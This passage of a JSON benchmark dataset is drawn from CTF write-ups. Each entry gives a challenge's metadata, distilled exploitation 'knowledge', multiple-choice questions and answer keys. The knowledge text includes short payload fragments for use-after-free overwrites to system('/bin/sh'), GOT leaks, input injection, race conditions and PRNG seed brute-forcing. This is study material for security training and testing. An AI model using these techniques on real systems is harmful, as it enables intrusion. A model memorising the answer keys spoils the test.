        "write_up": "dataset/raw/QuinEVM.md",
        "type": "web",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 388,
        "max_score": 488,
        "difficulty": 0.7950819672131147,
        "knowledge": [
            "To satisfy a smart contract's condition that requires the contract's bytecode to equal its output (quine requirement) in a blockchain CTF challenge, one can use minimal EVM assembly instructions for quine functionality. This involves using `CODESIZE`, `CALLVALUE`, and `CODECOPY` instructions to make the contract return its own bytecode. A contract must be crafted such that it is self-replicating, i.e., upon execution, it outputs its own bytecode. The payload for creating such a contract in EVM bytecode could look like this: `383434393834F3`, where each pair of hex digits represents a specific EVM instruction or operand that contributes to the quine's behavior.",
            "When testing a blockchain-related exploit, especially in Ethereum, tools like Truffle can significantly streamline the process. Truffle allows for easy compilation, deployment, and testing of smart contracts against a local blockchain. By creating a contract that deploys another contract containing the exploit (using the `CREATE` opcode in EVM for deployment) and asserting the conditions for the CTF challenge (like matching bytecodes to confirm the quine property), one can validate the effectiveness of their exploit in a controlled environment. This method is beneficial when interacting with contracts that have complex conditions or when attempting to ensure that an exploit works as intended before submitting it to a live CTF challenge or deploying it on the main network."
        ],
        "question": [
            "In a blockchain CTF challenge, you are tasked with creating a smart contract that must output its own bytecode when executed (a quine). Which combination of EVM assembly instructions correctly achieves this quine functionality? - A. `30`:`BALANCE` -> `31`:`ORIGIN` -> `F3`:`RETURN` - B. `60`:`PUSH1` -> `52`:`MSTORE` -> `F2`:`CALLCODE` - C. `38`:`CODESIZE` -> `34`:`CALLVALUE` -> `39`:`CODECOPY` -> `F3`:`RETURN` - D. `61`:`PUSH2` -> `56`:`JUMP` -> `F1`:`CALL` ",
            "When deploying and testing an Ethereum smart contract exploit for a CTF, which tool facilitates testing the exploit against a local Ethereum blockchain, compilation, and interaction with smart contracts? - A. Bitcoin Core - B. Geth - C. Truffle - D. Etherscan "
        ],
        "answer": [
            "C. `38`:`CODESIZE` -> `34`:`CALLVALUE` -> `39`:`CODECOPY` -> `F3`:`RETURN`",
            "C. Truffle"
        ]
    },
    {
        "name": "Quotebook",
        "write_up": "dataset/raw/Quotebook.md",
        "type": "pwn",
        "competition": [
            "DaVinci/2021",
            "https://ctftime.org/event/1296/tasks/"
        ],
        "score": 499,
        "max_score": 499,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving use-after-free vulnerabilities, when dealing with a structure that includes function pointers (`write` and `read` methods), one can overwrite these pointers with the address of a system function (`system()`) if they successfully leak a libc address by crafting structures on the heap. This approach requires manipulating allocations and deallocations to control the contents of freed memory. A precise manipulation of the heap can allow an attacker to construct fake structures pointing to critical application or library data (e.g., GOT) and leak function addresses such as `printf` to calculate the `system()` address.\n   \n   **Condition**: This knowledge applies when an application's logic includes creating, deleting, and reading from dynamically allocated structures that contain function pointers, alongside a vulnerability that allows heap manipulation (use-after-free).\n   \n   **Example payload**: \n   ```\n   b = b\"/bin/sh\\x00\" + pwn.pack(1, 64)\n   b += b\"A\"* 16\n   b += pwn.pack(system_addr, 64) * 2\n   ```",
            "To leak a libc address in a binary exploitation challenge where direct leaks are not immediately possible, consider hijacking the control flow via a use-after-free vulnerability by placing pointers to the GOT in unused/freed struct fields. This technique enables reading out libc addresses and thus calculating the base address of libc to bypass ASLR. The essential steps involve creating controlled allocations and deallocations to \"resurrect\" a freed structure and modify its fields, exploiting the application's functionality to read or write based on these manipulated structures.\n\n   **Condition**: Effective in scenarios where control over the application's allocation and freeing of memory allows manipulating the heap to point struct fields to critical sections like the GOT, leveraging functionalities (e.g., printing a struct) to leak addresses.\n\n   **Example payload**:\n   ```\n   buf = pwn.pack(RANDOM_BUF, 64) + pwn.pack(1, 64)\n   buf += pwn.pack(PRINTF_ADDR, 64) + pwn.pack(8, 64)\n   buf += pwn.pack(0x401236, 64) + pwn.pack(0x401294, 64)\n   ```"
        ],
        "question": [
            "In the context of exploiting use-after-free vulnerabilities to execute arbitrary code, which of the following actions is essential for manipulating function pointers within a freed structure to point to a malicious function such as `system()` in a cybersecurity challenge?  - A. Updating the structure's function pointers to point directly to the binary's entry point. - B. Modifying the structure's non-function-pointer fields to trigger a stack overflow. - C. Overwriting the structure's function pointers with the address of a `system()` function obtained through a libc address leak. - D. Changing the structure's data fields to contain shellcode instead of function pointers. ",
            "When exploiting a use-after-free vulnerability for leaking a libc address, which step is critical to manipulate a freed structure's fields to point to critical sections like the Global Offset Table (GOT) and facilitate the leak?  - A. Craft allocations and deallocations to manipulate the heap, allowing a freed struct to be reused with fields pointing to the GOT. - B. Utilize a buffer overflow in the application to overwrite the GOT directly without needing to manipulate freed structures. - C. Increase the reference count of the object to prevent it from being freed, avoiding the use-after-free condition altogether. - D. Encrypt the data within the structure before freeing it, ensuring that future allocations will decrypt it back to a usable state. "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Race Against The Machine",
        "write_up": "dataset/raw/Race Against The Machine.md",
        "type": "The type of the challenge described in this write-up is a `pwn` challenge.",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 200,
        "max_score": 600,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "To exploit a race condition vulnerability in web applications, a script that simultaneously sends multiple requests using threads can be effective. This approach is particularly useful when needing to achieve an action (e.g., purchasing an item) under certain conditions before a change in state occurs (such as a promotion ending or item availability decreasing). The script should create numerous threads, each performing the action that triggers the race condition. This method increases the likelihood of successfully exploiting the race condition by overcrowding the request handling, hence bypassing normal sequential processing.",
            "For tracking success in exploiting a race condition, the script should include functions to validate the outcome of the exploitation. In the context of this challenge, the script checks each thread (or user account) for a milestone, such as a specific account balance threshold being exceeded (indicating successful exploitation and gaining of an unintended advantage, such as extra miles or credits). Leveraging regular expressions to parse response data for verification purposes is a practical approach. This strategy allows for automated and efficient determination of whether the exploitation attempt succeeded across the different threads.\n\nSample validation logic (adapted and simplified):\n```\nimport re\n\ndef check_success(response_text):\n    match = re.search(r\".*Balance : (\\d+) Miles\", response_text)\n    if match and int(match.group(1)) > 1400:\n        return True\n    return False\n```"
        ],
        "question": [
            "Which Python feature is most effectively used to exploit a race condition by sending multiple requests simultaneously as described in the exploit method for obtaining promotional tickets before they run out? - A. Decorators - B. Multithreading - C. Lambda functions - D. List comprehensions",
            "In the described method of tracking success in a Python script designed to exploit a race condition, what is used to determine if the exploit was successful by checking if the account balance exceeded a certain threshold? - A. Parsing JSON response - B. Executing a JavaScript snippet - C. Leveraging regular expressions - D. Calling an external API"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "race wars",
        "write_up": "dataset/raw/race wars.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 135,
        "max_score": 500,
        "difficulty": 0.27,
        "knowledge": [
            "In vulnerabilites involving improper memory bounds checks, if the application does not enforce strict bounds on array or buffer sizes, it can lead to arbitrary read and write vulnerabilities. This can be exploited by setting a variable to its maximum possible value, which allows manipulating memory beyond the intended bounds. Example scenario could involve setting a transmission struct's gears_num to 0xffffffffffffffff to gain arbitrary read and write access.",
            "To exploit integer overflow vulnerabilities, carefully crafted user input can cause an integer variable to wrap around and become zero or a much smaller value than intended. This can be demonstrated by requesting an abnormally large number of objects (e.g., tire pairs), leading the application to allocate insufficient memory and thus allowing for adjacent memory space exploitation. Example payload: choosing 2**27 tire pairs to cause integer overflow and manipulate adjacent memory structures."
        ],
        "question": [
            "In the context of a racing game, when an attacker can set the `gears_num` field of a `transmission_struct` object to `0xffffffffffffffff`, which of the following best describes the vulnerability being exploited? - A. Integer Underflow - B. Buffer Overflow - C. Arbitrary Read and Write - D. Cross-Site Scripting ",
            "Which of the following best illustrates an integer overflow exploit in an application where a user's input directly influences memory allocation size, specifically when the input specifies an excessively large number of tire pairs leading to unintended memory allocation behavior? - A. Entering a negative number to bypass memory allocation checks. - B. Requesting `2**27` tire pairs to trigger an integer overflow. - C. Utilizing special characters in the input to escape validation checks. - D. Employing a timing attack to interfere with memory allocation. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RACHELL",
        "write_up": "dataset/raw/RACHELL.md",
        "type": "pwn",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 322,
        "max_score": 428,
        "difficulty": 0.7523364485981309,
        "knowledge": [
            "In scenarios involving pseudo file systems or simplified shells lacking certain commands (e.g., 'cat'), vulnerabilities may exist if specific commands fail to properly validate output. If a command (like 'pwd') prints output without validation and checking for allowed characters, this can be exploited to bypass output restrictions and potentially disclose sensitive information. This knowledge can be applied to find similar vulnerabilities in programs or challenges with custom shells or file systems. Example approach: Investigating custom implementations of shell commands to identify missing validations can lead to finding leaks or bypasses.",
            "For challenges involving heap exploitation, if a program implements custom deletion (e.g., 'rm' command that removes files or directories) that handles node unlinking inconsistently or improperly, it could introduce Use-After-Free (UAF) and Double Free vulnerabilities. This can be exploited by manipulating the heap to achieve arbitrary code execution or disclosure of sensitive information. When examining a program for heap-related vulnerabilities, paying attention to how it handles memory allocations, deallocations, and linkages between data structures can reveal exploitable flaws. Example payload generation involves careful crafting of input to trigger these conditions, often requiring a deep understanding of the heap manager's internals and the target's memory layout."
        ],
        "question": [
            "In a custom simplified shell simulation, the `pwd` command has been mistakenly implemented to print directory names without running an ASCII character check when the current directory is not the root. If an attacker creates a directory with a name containing non-ASCII characters (e.g., special symbols or control characters that could influence the program's behavior), which of the following effects could be potentially exploited from this oversight? - A. Direct execution of unauthorized shell commands - B. Bypassing output restrictions to disclose sensitive information - C. Automatic deletion of arbitrary files within the file system - D. Immediate crashing of the shell program to deny service ",
            "An application allows users to remove directories and files with a `rm` command; however, due to its implementation, it fails to properly unlink a node if its parent is not the root directory. This scenario could lead to security vulnerabilities such as Use-After-Free (UAF) and Double Free conditions. Given these details, what exploitation technique could most effectively take advantage of this flaw when crafting an attack payload? - A. Allocating large buffers to overflow adjacent memory - B. Creating symbolic links to escalate privileges - C. Manipulating object lifecycles to inject malicious code - D. Spoofing file attributes to gain unauthorized access "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "RageQuit",
        "write_up": "dataset/raw/RageQuit.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering file encryption malware in a CTF challenge, specifically using `xchacha20-poly1305`, files are encrypted by reading the original file, encrypting it, and overwriting the original content with random bytes from `/dev/urandom` to prevent file recovery. The initialization vector (nonce) for encryption can often be found in the beginning bytes of the encrypted file. Knowing this format can be critical in designing an approach for decryption once the encryption key is obtained.",
            "In challenges involving complex key derivation or operation sequences, reverse-engineering the malware's code can reveal that the key is manipulated through a series of mathematical and bitwise operations (such as shifts, adds, multiplies, and xors) that sometimes can be partially reversible or brute-forced. Even when a direct inverse operation is not possible (e.g., multiplication by a number with no multiplicative inverse in the given modulus), the independent manipulation of bytes means one can attempt to recover the original key byte-by-byte. This process requires understanding the specific operations applied to the key and devising a method to reverse or brute-force these operations to recover the original encryption key.\n\nSample of payload to start reversing key manipulation (derived from context, actual reversing logic may vary):\n```\n$key[$i] ^= $key[$i - 1];  // Reverse XOR operation\n\n// Brute-force loop for key recovery, based on known manipulations \nfor($i = 0; $i < 0x100; $i++) {  \n    // Repeat manipulations here in reverse or as a brute-force check...\n}\n```"
        ],
        "question": [
            "When analyzing the encryption mechanism of a file encryption malware that uses `xchacha20-poly1305`, it is observed that the initial bytes of an encrypted file contain a significant part of the encryption scheme. What does this part typically represent in the context of symmetric encryption algorithms like `xchacha20-poly1305`? - A. The file signature confirming successful encryption - B. The private key used for decrypting the contents - C. The nonce (initialization vector) required along with the key to decrypt - D. Metadata about the encryption algorithm version ",
            "In a CTF challenge involving reverse-engineering of malware's encryption routine, if the malware's encryption key undergoes a series of shifts, adds, multiplies, and xors, which of the following statements is correct regarding the possibility of recovering the original encryption key? - A. The key cannot be recovered because XOR operations are irreversible. - B. Each byte of the key can be brute-forced independently due to the independent manipulation of bytes, despite the impossibility of reversing multiplication by a non-invertible number. - C. The entire key must be brute-forced as a single unit because each operation affects the key globally. - D. Only the shifted and added segments of the key can be recovered; the multiplied part makes the rest of the key undecipherable. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RAIId Shadow Legends",
        "write_up": "dataset/raw/RAIId Shadow Legends.md",
        "type": "pwn",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": -1,
        "max_score": 300,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving uninitialized variables, especially in C++ programs, manipulating variables indirectly through unexpected inputs in earlier steps can lead to unintended behavior or vulnerabilities, allowing control over program logic. In the scenario of a game where skill level affects the outcome, providing unexpected input to an unrelated variable (`agreement`) to indirectly set the uninitialized `skill` variable can be exploited to control game flow or outcomes.\n   Example payload in Python:\n   ```python\n   p.sendline(b'yes\\0' + p32(0x539))\n   ```",
            "When dealing with programs that prompt for multiple inputs, carefully crafted inputs can overflow or inject into variables that are evaluated later in the program, even if they appear to be unrelated. Specifically, appending binary data (such as a crafted integer) to a string input where input sanitization or bounds checking is not properly conducted can alter program behavior in a favorable way.\n   Example payload in Python:\n   ```python\n   p.sendline('yes') # Regular input for program flow.\n   p.sendline(b'yes\\0' + p32(0x539)) # Injected input to manipulate the skill level.\n   ```"
        ],
        "question": [
            "In a C++ game challenge, which of the following Python payloads effectively manipulates a player's uninitialized `skill` variable by providing unexpected input to an earlier `agreement` string, ultimately controlling the game's logic? - A. p.sendline('yes' + chr(1337)) - B. p.sendline(b'yes\\0' + p64(0x539)) - C. p.sendline(b'yes\\0' + p32(0x539)) - D. p.sendline('yes' + str(0x539))",
            "How can a crafted input overflow or inject into variables evaluated later in a program, particularly by appending binary data to a string input, to alter program behavior beneficially? - A. p.sendline(b'yes\\0' + '1337') - B. p.sendline('yes' + p32(0x539)) - C. p.sendline(b'yes\\0' + p32(0x539)) - D. p.sendline('yes' + '\\0' + '1337')"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "RaKeeJaPassRPC",
        "write_up": "dataset/raw/RaKeeJaPassRPC.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 466,
        "max_score": 497,
        "difficulty": 0.937625754527163,
        "knowledge": [
            "In cryptographic systems using Diffie-Hellman (DH) key exchange or DH-like mechanisms, carefully review the validation of externally provided parameters. If the server or receiving end does not validate these parameters adequately, an attacker can manipulate these to their advantage. For example, setting a parameter to zero can significantly alter the expected outcome of mathematical operations, leading to unintended behaviors such as bypassing authentication or altering the shared secret.",
            "During the analysis of cryptographic protocols, especially those involving complex operations for key generation, identify where the input variables come from and if all inputs are properly authenticated or checked. Finding a step where an input is directly taken from an untrusted source (like a client or user input) and used in security-critical operations without proper validation can reveal vulnerabilities. In this case, manipulating the value of `A` to be `0` demonstrates how control over a single parameter can compromise the entire key exchange process, making it possible to deduce the shared secret or pass authentication checks against the system's expectations. This method can be generalized to other cryptographic implementations that might overlook the necessity of parameter validation.\n\nExample payload: Setting `A = 0` in a client request manipulates the shared secret generation, leading to an exploitable condition."
        ],
        "question": [
            "In a cryptographic system utilizing a DH-like key exchange mechanism, what happens if the client-provided value 'A' is set to 0, assuming no validation is performed by the server on this value? - A. The server crashes due to an unexpected value. - B. The operation completes successfully, but the resultant shared secret is not altered. - C. The value of 'S' becomes 0, regardless of other parameters, leading to potential security compromises. - D. A value of '0' is treated as an invalid input, and the server requests a new value from the client.",
            "In the context of analyzing cryptographic protocols for vulnerabilities, when a critical operation uses an input directly from an untrusted source without validation, what could a strategic manipulation of this input achieve? - A. It could slightly delay the key generation process but will not affect the overall protocol security. - B. Manipulating the input can cause an error in the protocol, alerting administrators to a possible attack. - C. It can enable an attacker to bypass authentication or derive the shared secret without the intended cryptographic assurance. - D. Such manipulation only affects the computational efficiency of the protocol without compromising security."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Random ECB",
        "write_up": "dataset/raw/Random ECB.md",
        "type": "crypto",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 50,
        "max_score": 1991,
        "difficulty": 0.025113008538422903,
        "knowledge": [
            "In AES ECB mode encryption, the key aspect is that each block is encrypted independently, which means the identical plaintext blocks will result in identical ciphertext blocks when encrypted with the same key. This property can be exploited to decipher parts of the plaintext if a predictable or controlled block of data can be inserted by the attacker, such as a block consisting of repeated characters ('aaaaaaaaaaaaaaa'). By manipulating the input and comparing the encrypted blocks, one can reveal the plaintext block by block.\n   \n   **Example exploitation technique**: If the attacker knows the structure of the plaintext (e.g., a known text concatenated with an unknown flag) and can insert a controlled block of text before the unknown part, they can brute-force each character of the unknown part by observing which input results in an identical ciphertext block, thereby revealing the hidden information.",
            "Implementing a brute-force approach to discover unknown characters in AES ECB encrypted messages requires carefully planning the inputs and comparing the resulting ciphertexts. When the encryption process adds a random prefix to the plaintext (e.g., a single character like 'A' half the time), this adds a layer of variability that can still be overcome. By submitting a specific pattern of characters ('a'*15, in this example) multiple times, an attacker can distinguish between ciphertexts generated with and without the prefix, based on the repeated block structure of ECB mode. This differential analysis can then be extended to guess and confirm each successive character of the unknown portion of the plaintext (e.g., a flag).\n\n   **Brute-force approach under variability**: To bypass the prefix randomness, the attacker can send the controlled input multiple times to ensure getting both versions of the ciphertext (with and without the random prefix). This establishes a baseline for comparison. Continuing with a trial-and-error process for each character position in the unknown plaintext by appending guessed characters to the controlled input allows the attacker to check for matching ciphertext patterns, successively revealing the full plaintext."
        ],
        "question": [
            "In the context of exploiting AES ECB mode encryption vulnerabilities, what is the significance of ECB's property that identical plaintext blocks result in identical ciphertext blocks? - A. It allows for easy decryption without the key. - B. Identical plaintext blocks encrypted under the same key will result in different ciphertext blocks, enhancing security. - C. It can be exploited to decipher plaintext if a predictable block can be inserted by an attacker. - D. ECB mode encryption requires a different key for each block, preventing this form of attack.",
            "When addressing the challenge of a brute-force attack against AES ECB encrypted messages with a random prefix, what strategy allows an attacker to effectively compare ciphertexts? - A. Submitting random strings as input and expecting different outputs each time. - B. Sending a pattern of repeated characters multiple times to distinguish between ciphertexts with and without the random prefix. - C. Utilizing a single, long string of unique characters to ensure a wide variety of ciphertext outputs for analysis. - D. Ignoring the prefix and focusing only on the last block of ciphertext for comparison."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Random Number Generator",
        "write_up": "dataset/raw/Random Number Generator.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 250,
        "max_score": 800,
        "difficulty": 0.3125,
        "knowledge": [
            "If a pseudorandom number generator (PRNG) uses system time as its seed, it's possible to predict future output by synchronizing the attack script's clock to the target server's clock, and then brute-forcing the seed within a certain time range. This is particularly viable when the seed is derived from a rounded or truncated version of the current time, making the seed space small enough to feasibly search through.\n   \n   Example payload snippet for syncing and bruteforcing the seed:\n   ```python\n   import time, random\n   current_time = time.time()\n   for offset in range(200):  # Brute-force within a small range around the current time\n       seed = round((current_time + offset / 1000) / 100, 5)\n       random.seed(seed)\n       # Continue with generating numbers and comparing to known output\n   ```",
            "The floating point precision of the seed value can be crucial when attempting to brute-force the state of a PRNG. To avoid missing the correct seed due to floating point rounding, it's necessary to carefully choose the granularity of the brute-force step, ensuring it's fine enough to account for the precision used in the seeding process but also coarse enough to make the brute-force search feasible within a reasonable time frame.\n\n   Example payload snippet for accounting for floating point precision in seed brute-forcing:\n   ```python\n   seed_attempt = round((current_time + offset / 1000) / 100, 5)\n   random.seed(seed_attempt)\n   # Proceed to generate numbers and check against known output, with `offset` adjusting the seed in small steps\n   ```"
        ],
        "question": [
            "When attempting to exploit a pseudorandom number generator that uses system time as its seed, which of the following actions best facilitates predicting future output numbers? - A. Sending a large amount of requests in a short time to overload the PRNG. - B. Synchronizing the attacker\u2019s clock to the server\u2019s clock and brute-forcing the seed within a certain time range. - C. Modifying the PRNG\u2019s source code to remove time-based seeding. - D. Using a high-powered computer to simulate all possible PRNG states.",
            "In the context of maximizing the effectiveness of brute-forcing the PRNG state, why is the adjustment of the brute-force step granularity important considering floating point precision? - A. To speed up the brute-force process by reducing the number of required attempts. - B. To ensure compliance with international cryptography standards. - C. To avoid skipping a possible seed by matching the precision used in the seeding process. - D. To increase the randomization of the seed and make the PRNG more secure."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "randrevenge",
        "write_up": "dataset/raw/randrevenge.md",
        "type": "This write-up is for a reverse challenge.",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 475,
        "max_score": 482,
        "difficulty": 0.9854771784232366,
        "knowledge": [
            "When working on challenges involving prediction or manipulation of pseudo-random number sequences, consider whether the seed for the random sequence is based on a predictable or known value. If so, collecting pairs of seeds and their corresponding first generated number can narrow down potential seeds to test against the application logic.",
            "In scenarios where an application does not implement rate limiting, it allows for brute-force approaches. This means you can attempt a large number of requests to test different seeds or inputs without being blocked. Utilize this by designing a script to automate requests and analyze responses, continuing the process with new batches of inputs until the correct answer is found. \n\nSample Payload: Not applicable due to the context of the provided solution involving scripting and handling of responses rather than a single payload usage."
        ],
        "question": [
            "In a CTF challenge focusing on pseudo-random number generation, given that the seed is potentially based on a predictable or known value, which approach is most effective for narrowing down potential seeds to identify the correct sequence?  - A. Collect pairs of seeds and their first generated numbers to reduce the pool of potential seeds to test against the server. - B. Generate a list of random numbers without considering the seed and test each against the server. - C. Focus on cracking the algorithm without collecting any data on seeds and their generated numbers. - D. Use a fixed seed for all tests regardless of the server's response. ",
            "When exploiting vulnerabilities in a web application that lacks rate limiting, which strategy best utilizes this oversight to test different inputs or seeds for obtaining the correct response?  - A. Manually send requests one at a time, analyzing each response to determine the next action. - B. Design a script that automates the process of sending requests in batches, analyzes the responses, and iterates with new inputs until the correct answer is found. - C. Avoid automation and focus on social engineering tactics to retrieve the correct inputs. - D. Use a single request with all possible inputs and hope the server processes each sequentially. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "randrevengerevenge",
        "write_up": "dataset/raw/randrevengerevenge.md",
        "type": "This write-up is for a crypto challenge.",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 482,
        "max_score": 482,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges related to predicting the output of a pseudo-random number generator (PRNG) where the seed is based on a predictable or partially known input, pre-generate a mapping of potential seeds to their corresponding first output. This approach reduces the computational effort needed at runtime by transforming the problem into a lookup task. Utilize this strategy especially in scenarios where the server provides part of the output sequence and expects the next value in the sequence without rate limiting, allowing for rapid trial-and-error without penalties.\n\n    Example payload structure (adjusted for specific challenge context):\n    ```\n    with open('seed_output_mapping.csv') as csvfile:\n        for row in csv.reader(csvfile):\n            # Assuming row[0] is the seed and row[1] is the first number generated by that seed\n            if target_output in seed_output_mapping:\n                candidate_seeds = seed_output_mapping[target_output]\n                # Use candidate_seeds to predict the next output.\n    ```",
            "In cases where the challenge involves communication with a server that sends a sequence generated from a seed and expects the next number in that sequence, iteratively test a subset of candidate seeds against additional sequences provided by the server upon request. This method is particularly effective in environments where the server does not implement request rate limiting. It allows for a brute-force approach across multiple attempts rather than necessitating the immediate identification of the correct seed.\n\n    Example approach (simplified for clarity):\n    ```\n    while True:\n        # Send a request to the server to obtain the current sequence\n        response = requests.post(target_url)\n        data = response.text.split(\"\\n\")\n        sequence = process_sequence_data(data)\n        \n        # Attempt to find the correct seed from a pre-generated list of candidate seeds\n        for seed, first_output in pre_generated_seed_output_pairs:\n            if sequence_matches(seed, sequence):\n                # Predict and submit the next number in the sequence\n                next_number = predict_next_number(seed, sequence)\n                submit_response = requests.post(target_url + \"submit\", data={\"next\": next_number})\n                if \"success_message\" in submit_response.text:\n                    print(\"Success:\", submit_response.text)\n                    break\n    ```"
        ],
        "question": [
            "Which approach is most effective when attempting to predict the next output of a pseudo-random number generator (PRNG), knowing the server provides part of the output sequence without rate limiting? - A. Reverse engineer the PRNG algorithm to directly calculate the next output without any pre-computation. - B. Pre-generate a mapping of potential seeds to their corresponding first output to transform the problem into a lookup task when provided with part of the output sequence by the server. - C. Randomly guess the next output until the correct number is identified, leveraging the absence of rate limiting. - D. Manually calculate potential outputs for all possible seeds in real-time to find the correct next number.",
            "In a scenario with a server that does not implement request rate limiting and sends a sequence generated from a seed, expecting the next number in that sequence, what method should be employed to efficiently find the correct seed and predict the next number? - A. Utilize a machine learning model to predict the next number based on patterns recognized in the sequence. - B. Iteratively test a subset of candidate seeds against additional sequences provided by the server upon request, using a brute-force approach to find the correct seed. - C. Decrypt the sequence using advanced cryptographic techniques to find the seed. - D. Only use the initial sequence provided to mathematically derive the seed without further interaction with the server."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "RCE Auditor",
        "write_up": "dataset/raw/RCE Auditor.md",
        "type": "web",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with restrictions imposed by browsers preventing access to certain ports (like `ERR_UNSAFE_PORT` for port 6666), an alternative approach using WebRTC API can be explored for establishing peer-to-peer connections that bypass these restrictions. This is particularly useful for scenarios where direct HTTP(S) connections to a target service are blocked either by browser security features or firewall rules.",
            "In scenarios where direct manipulation or control over network packets is required but restricted by standard client-server protocols (HTTP/S, FTP), leveraging the STUN protocol via WebRTC's ICE candidate configuration allows for partial control over the packet contents. Specifically, the exploitation of `ice-ufrag` and `ice-pwd` in the ICE candidate configuration can be used for authentication or other purposes, demonstrating that control over packet contents to some extent is possible, bypassing certain types of input filtering or RCE (Remote Code Execution) protection mechanisms.\n   \n   Example of exploiting this approach is not straightforward and requires deep understanding of the WebRTC API, STUN/TURN protocols, and the RFC 5245 (for `ice-ufrag` and `ice-pwd`). Proper construction of the exploit would involve setting up a WebRTC connection that includes malicious ICE candidates with carefully crafted `ice-ufrag` and `ice-pwd` values aiming to exploit vulnerabilities on the target server."
        ],
        "question": [
            "Regarding the scenario where browsers block access to certain unsafe ports like 6666 due to `ERR_UNSAFE_PORT`, which of the following is a valid method to establish a peer-to-peer connection that bypasses these restrictions? - A. Utilizing SMTP protocol to indirectly access the blocked port. - B. Employing WebRTC API for establishing a peer-to-peer connection. - C. Leveraging traditional AJAX requests to bypass browser restrictions. - D. Using WebSocket connections to directly access the blocked ports. ",
            "In a context where direct manipulation of network packets is necessary but restricted by protocols such as HTTP/S or FTP, which WebRTC feature allows for partial control over the packet contents, particularly useful in bypassing RCE protection mechanisms? - A. Direct manipulation of the `SessionDescription` object to inject arbitrary packet content. - B. Modification of the `RTCDataChannel` to include custom packet headers. - C. Exploiting the `ice-ufrag` and `ice-pwd` in ICE candidate configuration for packet content manipulation. - D. Utilizing the `setLocalDescription` method to override packet content with malicious payloads. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "RE warmup",
        "write_up": "dataset/raw/RE warmup.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 627,
        "max_score": 1000,
        "difficulty": 0.627,
        "knowledge": [
            "When analyzing statically compiled binaries for hidden or added functionalities, comparing available command-line parameters with those of the known original software can be an effective method. This comparison might reveal undocumented or altered functionalities introduced in the patched version. In this scenario, identifying an additional 'z' parameter not present in the original binary pointed to a modified functionality.",
            "To reverse engineer and decrypt hardcoded encrypted data embedded within a binary, one can follow the logical operations applied to the data and then apply the inverse operations. The first step involves understanding how the data is manipulated\u2014such as through combination of XOR and modular arithmetic operations on each byte of data. Subsequently, applying the inverse operations to the provided constants or encrypted data can reveal the original plaintext. In the described challenge, the encrypted data was processed through a loop with XOR and addition/subtraction operations; reversing these operations with the correct understanding of their application order and the modification per byte based on its index revealed the plaintext flag.\n\n```python\n# Inverse operations for decryption\ndef main():  \n   data = [0xAA, 0xB0, 0xA2, 0xB6, 0xA2, 0x91, 0x71, 0xB1, 0xA7, 0x80, 0x96, 0x97, 0x78, 0xB6, 0x9E, 0x99, 0x72, 0x97, 0x85, 0x98, 0x8F, 0x91, 0x7F, 0x77, 0x7C, 0x80, 0x9D, 0x61, 0xAB, 0x95, 0x8A, 0x7F, 0xB4, 0x8F, 0x9F, 0x35, 0x9F, 0x87, 0x8D, 0x98, 0x95, 0x9F, 0x8D, 0xAA]  \n   result = ''  \n   for i, d in enumerate(data):  \n       result += chr((d + 0x42 % (i + 1) - 0x41) ^ i)  \n   print(result)\n\nmain()  \n```"
        ],
        "question": [
            "When conducting an analysis of a statically compiled binary to find secret functionalities, why is comparing command-line parameters with the original software version considered effective? - A. It helps in updating the binary for better performance. - B. It can reveal undocumented or altered functionalities not present in the original version. - C. It simplifies the debugging process of the binary. - D. It aids in the documentation of new features.",
            "In the process of decrypting hardcoded data embedded within a binary, what is the correct order of operations for reversing encryption that involves XOR and modular arithmetic operations on each data byte? - A. Apply XOR before modular arithmetic on the encrypted data. - B. Perform addition, then XOR, and finally modular arithmetic to decrypt. - C. First apply modular arithmetic, then subtraction, and lastly XOR on the encrypted data. - D. XOR each byte of data with its index, followed by addition or subtraction of specific values, applying modular arithmetic when necessary."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Read The Rules",
        "write_up": "dataset/raw/Read The Rules.md",
        "type": "misc",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
